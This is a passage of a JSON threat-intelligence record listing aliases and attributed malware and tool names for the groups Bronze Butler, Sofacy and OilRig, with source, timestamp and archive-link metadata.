                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536180,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1653714845,
    "ts_modification_date": 1653714845,
    "files": {
        "pdf": "https://archive.orkl.eu/3443d427defa718caf068fcdf2e1b66d694401d4.pdf",
        "text": "https://archive.orkl.eu/3443d427defa718caf068fcdf2e1b66d694401d4.txt",
        "img": "https://archive.orkl.eu/3443d427defa718caf068fcdf2e1b66d694401d4.jpg"
    }
}